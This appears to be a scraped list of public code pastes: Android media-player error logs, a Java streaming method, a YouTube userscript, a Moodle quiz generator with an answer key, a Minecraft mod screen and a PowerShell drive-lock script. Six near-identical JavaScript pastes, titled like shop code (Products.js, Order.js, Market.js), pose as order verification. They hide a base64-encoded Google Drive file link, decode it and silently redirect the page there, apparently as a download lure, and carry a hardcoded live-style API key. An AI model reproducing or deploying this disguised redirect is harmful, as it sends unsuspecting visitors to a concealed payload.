id,title,username,language,date,content
rTdzQrye,Untitled,dentira,JavaScript,Friday 11th of April 2025 08:26:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20703/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fSVWC19b,2025-04-11T15:13:37.808,powerampache,PHP,Friday 11th of April 2025 08:13:38 AM CDT,"1.01-76 (76) - DB: 83
androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 502
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError Invalid response code 502 - Bad Gateway - HttpDataSource.InvalidResponseCodeException 
onPlayerError Invalid response code 502 - Bad Gateway
 {""headerFields"":{""null"":[""HTTP/1.1 502 Bad Gateway""],""Connection"":[""keep-alive""],""Content-Length"":[""157""],""Content-Type"":[""text/html""],""Date"":[""Fri, 11 Apr 2025 13:13:38 GMT""],""Referrer-Policy"":[""no-referrer""],""Server"":[""nginx/1.18.0""],""Strict-Transport-Security"":[""max-age\u003d31536000; includeSubDomains""],""X-Android-Received-Millis"":[""1744377217787""],""X-Android-Response-Source"":[""NETWORK 502""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1744377217766""],""X-Content-Type-Options"":[""nosniff""],""X-Download-Options"":[""noopen""],""X-Frame-Options"":[""SAMEORIGIN""],""X-Permitted-Cross-Domain-Policies"":[""none""],""X-Robots-Tag"":[""none""],""X-XSS-Protection"":[""1; mode\u003dblock""]},""responseBody"":[60,104,116,109,108,62,13,10,60,104,101,97,100,62,60,116,105,116,108,101,62,53,48,50,32,66,97,100,32,71,97,116,101,119,97,121,60,47,116,105,116,108,101,62,60,47,104,101,97,100,62,13,10,60,98,111,100,121,62,13,10,60,99,101,110,116,101,114,62,60,104,49,62,53,48,50,32,66,97,100,32,71,97,116,101,119,97,121,60,47,104,49,62,60,47,99,101,110,116,101,114,62,13,10,60,104,114,62,60,99,101,110,116,101,114,62,110,103,105,110,120,47,49,46,50,55,46,52,60,47,99,101,110,116,101,114,62,13,10,60,47,98,111,100,121,62,13,10,60,47,104,116,109,108,62,13,10],""responseCode"":502,""responseMessage"":""Bad Gateway"",""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 502"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]}"
zcnu7U9Y,2025-04-11T15:10:55.283,powerampache,PHP,Friday 11th of April 2025 08:10:55 AM CDT,"1.01-76 (76) - DB: 83
androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 502
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError Invalid response code 502 - Bad Gateway - HttpDataSource.InvalidResponseCodeException 
onPlayerError Invalid response code 502 - Bad Gateway
 {""headerFields"":{""null"":[""HTTP/1.1 502 Bad Gateway""],""Connection"":[""keep-alive""],""Content-Length"":[""157""],""Content-Type"":[""text/html""],""Date"":[""Fri, 11 Apr 2025 13:10:55 GMT""],""Referrer-Policy"":[""no-referrer""],""Server"":[""nginx/1.18.0""],""Strict-Transport-Security"":[""max-age\u003d31536000; includeSubDomains""],""X-Android-Received-Millis"":[""1744377055269""],""X-Android-Response-Source"":[""NETWORK 502""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1744377055236""],""X-Content-Type-Options"":[""nosniff""],""X-Download-Options"":[""noopen""],""X-Frame-Options"":[""SAMEORIGIN""],""X-Permitted-Cross-Domain-Policies"":[""none""],""X-Robots-Tag"":[""none""],""X-XSS-Protection"":[""1; mode\u003dblock""]},""responseBody"":[60,104,116,109,108,62,13,10,60,104,101,97,100,62,60,116,105,116,108,101,62,53,48,50,32,66,97,100,32,71,97,116,101,119,97,121,60,47,116,105,116,108,101,62,60,47,104,101,97,100,62,13,10,60,98,111,100,121,62,13,10,60,99,101,110,116,101,114,62,60,104,49,62,53,48,50,32,66,97,100,32,71,97,116,101,119,97,121,60,47,104,49,62,60,47,99,101,110,116,101,114,62,13,10,60,104,114,62,60,99,101,110,116,101,114,62,110,103,105,110,120,47,49,46,50,55,46,52,60,47,99,101,110,116,101,114,62,13,10,60,47,98,111,100,121,62,13,10,60,47,104,116,109,108,62,13,10],""responseCode"":502,""responseMessage"":""Bad Gateway"",""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 502"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]}"
hRwRy2vA,Products.js,dentira,JavaScript,Friday 11th of April 2025 08:10:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/74122/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sHXMVhwU,Order.js,dentira,JavaScript,Friday 11th of April 2025 07:55:22 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16222/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0H9B7263,ExoPlayer buildMediaSource Method,solodroid,Java,Friday 11th of April 2025 07:47:23 AM CDT,"    @SuppressLint(""SwitchIntDef"")
    private MediaSource buildMediaSource(Uri uri, DefaultDataSource.Factory dataSourceFactory) {
        MediaItem mMediaItem = MediaItem.fromUri(Uri.parse(String.valueOf(uri)));
        int type = TextUtils.isEmpty(null) ? Util.inferContentType(uri) : Util.inferContentType(""."" + null);
        switch (type) {
            case C.TYPE_DASH:
                return new DashMediaSource.Factory(dataSourceFactory)
                        .createMediaSource(mMediaItem);
            case C.TYPE_HLS:
                return new HlsMediaSource.Factory(dataSourceFactory)
                        .setAllowChunklessPreparation(true)
                        .createMediaSource(mMediaItem);
            case C.TYPE_OTHER:
                if (uri.toString().contains("".m3u8"")) {
                    return new HlsMediaSource.Factory(dataSourceFactory)
                            .setAllowChunklessPreparation(true)
                            .createMediaSource(mMediaItem);
                } else {
                    return new ProgressiveMediaSource.Factory(dataSourceFactory, new DefaultExtractorsFactory())
                            .createMediaSource(mMediaItem);
                }
            case C.TYPE_RTSP:
                return new RtspMediaSource.Factory()
                        .createMediaSource(MediaItem.fromUri(uri));
            default: {
                throw new IllegalStateException(""Unsupported type: "" + type);
            }
        }
    }"
dfT2UrUQ,Remove YouTube Sponsored Label Overlay,deuxdoom,JavaScript,Friday 11th of April 2025 07:41:04 AM CDT,"// ==UserScript==
// @name         Remove YouTube Sponsored Label Overlay
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  유료 광고 포함 라벨 오클릭 방지 제거 Hides YouTube ""includes promotion"" overlays & disables redirection
// @author       SAKURA
// @match        https://www.youtube.com/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    const BLOCK_SELECTORS = [
        'a[href*=""https://support.google.com/youtube?p=ppp""]',
        '.ytm-paid-content-overlay-renderer',
        '.YtmPaidContentOverlayHost',
        '#paid-content-overlay', // 기타 다양한 이름들 고려함
        '[aria-label*=""includes promotion""]', // 접근성 기준으로도 제거
        'tp-yt-paper-tooltip' // 일부 툴팁도 차단
    ];

    const observer = new MutationObserver(() => {
        BLOCK_SELECTORS.forEach(selector => {
            document.querySelectorAll(selector).forEach(el => {
                el.remove(); // 아주 그냥 통째로 제거
            });
        });
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true
    });
})();
"
tzP6mN4d,Market.js,dentira,JavaScript,Friday 11th of April 2025 07:39:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05458/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tFSVZpVV,Untitled,dentira,JavaScript,Friday 11th of April 2025 07:24:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/89474/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SKjqYYqW,moodle preview link,mayankjoin3,Python,Friday 11th of April 2025 07:24:23 AM CDT,"#preview link is without the option marked.

start=53205
for i in range(25):
    print(f""""""https://cetpgex.iitp.ac.in/moodle/question/bank/previewquestion/preview.php?id={start}&restartversion=0&courseid=314&behaviour=deferredfeedback&maxmark=1&correctness=1&marks=2&markdp=2&feedback=1&generalfeedback=1&rightanswer=1&history&returnurl=https%3A%2F%2Fcetpgex.iitp.ac.in%2Fmoodle%2Fquestion%2Fedit.php%3Fcourseid%3D314%26amp%3Bcat%3D4833%252C36016%26amp%3Bfilter%3D%257B%2522category%2522%253A%257B%2522jointype%2522%253A1%252C%2522values%2522%253A%255B%25224833%2522%255D%252C%2522filteroptions%2522%253A%257B%2522includesubcategories%2522%253Afalse%257D%257D%252C%2522hidden%2522%253A%257B%2522jointype%2522%253A1%252C%2522values%2522%253A%255B0%255D%257D%257D%26amp%3Bdeleteall%3D1&variant=1"""""")
    start+=1
"
KXnDgiQg,unfinished screen,CreativeMasterBonin,Java,Friday 11th of April 2025 07:21:44 AM CDT,"package net.bcm.cmatd.gui;

import net.bcm.cmatd.Cmatd;
import net.bcm.cmatd.Utility;
import net.bcm.cmatd.blockentity.BaseEnergyMakerBE;
import net.minecraft.client.gui.GuiGraphics;
import net.minecraft.client.gui.screens.inventory.AbstractContainerScreen;
import net.minecraft.network.chat.Component;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.entity.player.Inventory;
import net.minecraft.world.level.material.Fluids;
import net.neoforged.neoforge.common.Tags;
import net.neoforged.neoforge.fluids.FluidStack;

import java.util.List;

public class FoodReactorScreen extends AbstractContainerScreen<FoodReactorMenu> {
    private static final int ENERGY_LEFT = 7;
    private static final int ENERGY_WIDTH = 121;
    private static final int ENERGY_TOP = 90;
    private static final int ENERGY_HEIGHT = 4;

    private static final int LIQUID_LEFT = 132;
    private static final int LIQUID_TOP = 16;
    private static final int LIQUID_BOTTOM = 116;
    private static final int LIQUID_RIGHT = 170;
    private static final int LIQUID_WIDTH = 38;
    private static final int LIQUID_HEIGHT = 100;

    private static final ResourceLocation BG = ResourceLocation.parse(""cmatd:textures/gui/food_reactor.png"");
    private static final ResourceLocation WHITE_BOX = ResourceLocation.parse(""minecraft:textures/block/white_stained_glass.png"");

    public FluidTankGUIRenderer fluidRenderer;

    public FoodReactorScreen(FoodReactorMenu menu, Inventory playerInventory, Component title) {
        super(menu, playerInventory, title);
        this.imageHeight = 216;
        this.imageWidth = 176;
    }

    @Override
    protected void init() {
        super.init();
        this.fluidRenderer = new FluidTankGUIRenderer(Utility.FOOD_REACTOR_FLUID_CAPACITY,
                LIQUID_WIDTH,LIQUID_HEIGHT);
    }

    @Override
    protected void renderBg(GuiGraphics guiGraphics, float partialTick, int mouseX, int mouseY) {
        guiGraphics.blit(BG, leftPos, topPos, 0, 0, this.imageWidth, this.imageHeight);
        int power = menu.getEnergy();
        int p = (int) ((power / (float) BaseEnergyMakerBE.CAPACITY) * ENERGY_WIDTH);
        guiGraphics.fillGradient(leftPos + ENERGY_LEFT, topPos + ENERGY_TOP, leftPos + ENERGY_LEFT + p, topPos + ENERGY_TOP + ENERGY_HEIGHT, Utility.BRIGHT_LIGHT_BLUE, Utility.DARKER_BLUE);
        guiGraphics.fill(leftPos + ENERGY_LEFT + p, topPos + ENERGY_TOP, leftPos + ENERGY_LEFT + ENERGY_WIDTH, topPos + ENERGY_TOP + ENERGY_HEIGHT, Utility.DARKEST_GRAYER_BLUE);
    }

    @Override
    public void render(GuiGraphics guiGraphics, int mouseX, int mouseY, float partialTick) {
        super.render(guiGraphics, mouseX, mouseY, partialTick);
        if (mouseX >= leftPos + ENERGY_LEFT && mouseX < leftPos + ENERGY_LEFT + ENERGY_WIDTH && mouseY >= topPos + ENERGY_TOP && mouseY < topPos + ENERGY_TOP + ENERGY_HEIGHT) {
            int power = menu.getEnergy();
            List<Component> components = List.of(
                    Component.translatable(""title.energy_fe_with_max"",power,menu.getBlockEntity().energyStorage.getMaxEnergyStored())
            );
            guiGraphics.renderComponentTooltip(this.font,components,mouseX,mouseY);
        }
        else if(mouseX >= leftPos + LIQUID_LEFT && mouseX < leftPos + LIQUID_LEFT + LIQUID_WIDTH && mouseY >= topPos + LIQUID_TOP && mouseY < topPos + LIQUID_TOP + LIQUID_HEIGHT){
            int liquidAmount = menu.fluidAmtStored;
            List<Component> components2 = List.of(
                    Component.translatable(""title.liquid_amt_with_max"",liquidAmount,menu.getBlockEntity().fluidTank.getCapacity())
            );
            guiGraphics.renderComponentTooltip(this.font,components2,mouseX,mouseY);
        }
        else{
            this.renderTooltip(guiGraphics, mouseX, mouseY);
        }

        //
        try{
            fluidRenderer.render(guiGraphics,new FluidStack(menu.fluidStored,Utility.FOOD_REACTOR_FLUID_CAPACITY),
                    leftPos + LIQUID_LEFT,topPos + LIQUID_TOP);
        }
        catch(Exception e){
            Cmatd.getLogger().error(""FoodReactorScreen encountered an error: {}"",e.getMessage());
        }
    }

    @Override
    protected void renderLabels(GuiGraphics guiGraphics, int mouseX, int mouseY) {
        guiGraphics.drawString(this.font, this.title,
                this.imageWidth - 169, this.imageHeight - 210, Utility.INT_WHITE, false);
        guiGraphics.drawString(this.font, this.playerInventoryTitle,
                this.imageWidth - 169, this.imageHeight - 100, Utility.INT_WHITE, false);
    }
}
"
aZEudABn,moodle mcq xml,mayankjoin3,XML,Friday 11th of April 2025 07:20:46 AM CDT,"ans = {
'Q01': 'C',
'Q02': 'B',
'Q03': 'A',
'Q04': 'A',
'Q05': 'B',
'Q06': 'A',
'Q07': 'A',
'Q08': 'A',
'Q09': 'C',
'Q10': 'A',
'Q11': 'B',
'Q12': 'A',
'Q13': 'A',
'Q14': 'D',
'Q15': 'A',
'Q16': 'B',
'Q17': 'C',
'Q18': 'A',
'Q19': 'C',
'Q20': 'A',
'Q21': 'B',
'Q22': 'B',
'Q23': 'A',
'Q24': 'B',
'Q25': 'C'
}

start = 53279

options = ['A', 'B', 'C', 'D']

with open(""questions_ENDSEM_JAN_APR25.xml"", ""w"", encoding=""utf-8"") as f:
    for i in range(1, 26):
        qid = f""Q{i:02}""
        correct = ans.get(qid, None)  # None if not specified
        question_block = f""""""<!-- question: {start}  -->
    <question type=""multichoice"">
        <name>
        <text>{qid}</text>
        </name>
        <questiontext format=""html"">
        <text><![CDATA[<p> </p>]]></text>
        </questiontext>
        <generalfeedback format=""html"">
        <text></text>
        </generalfeedback>
        <defaultgrade>1.0000000</defaultgrade>
        <penalty>0</penalty>
        <hidden>0</hidden>
        <idnumber></idnumber>
        <single>true</single>
        <shuffleanswers>false</shuffleanswers>
        <answernumbering>abc</answernumbering>
        <showstandardinstruction>0</showstandardinstruction>
        <correctfeedback format=""html"">
        <text></text>
        </correctfeedback>
        <partiallycorrectfeedback format=""html"">
        <text></text>
        </partiallycorrectfeedback>
        <incorrectfeedback format=""html"">
        <text></text>
        </incorrectfeedback>""""""

        for opt in options:
            fraction = ""100"" if correct == opt else ""0""
            question_block += f""""""
        <answer fraction=""{fraction}"" format=""html"">
        <text><![CDATA[<p>Option {opt}</p>]]></text>
        <feedback format=""html"">
            <text></text>
        </feedback>
        </answer>""""""

        question_block += """"""
    </question>\n""""""
        f.write(question_block)
        start += 1

print(""XML file 'questions.xml' generated successfully."")



#preview link is without the option marked.

#Mcq testing 
#start=53304
#for i in range(25):
#    print(f""""""https://cetpgex.iitp.ac.in/moodle/question/bank/previewquestion/preview.php?id={start}&restartversion=0&courseid=314&returnurl=%2Fquestion%2Fedit.php%3Fcourseid%3D314%26cat%3D4836%252C36016%26deleteall%3D1"""""")

    
#    start+=1
"
mYRn9R4V,Products.js,dentira,JavaScript,Friday 11th of April 2025 07:09:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/75256/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LSC1CfZ8,AutoLock VHD,Nom1fan,PowerShell,Friday 11th of April 2025 07:03:01 AM CDT,"$driveLetter = ""V:""  # Set your drive letter here
$idleMinutes = 1
$idleThreshold = $idleMinutes * 60

# Define native method for idle detection
Add-Type @""
using System;
using System.Runtime.InteropServices;

public static class IdleTime {
    [StructLayout(LayoutKind.Sequential)]
    struct LASTINPUTINFO {
        public uint cbSize;
        public uint dwTime;
    }

    [DllImport(""user32.dll"")]
    static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

    public static int GetIdleTimeInSeconds() {
        LASTINPUTINFO lii = new LASTINPUTINFO();
        lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
        if (!GetLastInputInfo(ref lii)) {
            return 0;
        }
        return (Environment.TickCount - (int)lii.dwTime) / 1000;
    }
}
""@

function Get-IdleTime {
    return [IdleTime]::GetIdleTimeInSeconds()
}

Write-Host ""Auto-lock script running. Will lock $driveLetter after $idleMinutes minutes of inactivity.""

while ($true) {
    $idleTime = Get-IdleTime
    Write-Host ""Idle time: $idleTime seconds""

    if ($idleTime -ge $idleThreshold) {
        Write-Host ""Idle for $idleTime seconds. Locking drive $driveLetter...""
        manage-bde -lock $driveLetter -ForceDismount

        # Wait for some activity before continuing (reset loop after user returns)
        do {
            Start-Sleep -Seconds 10
            $idleTime = Get-IdleTime
        } while ($idleTime -ge 30)

        Write-Host ""User activity detected. Resuming idle monitoring...""
    }

    Start-Sleep -Seconds 30
}
"
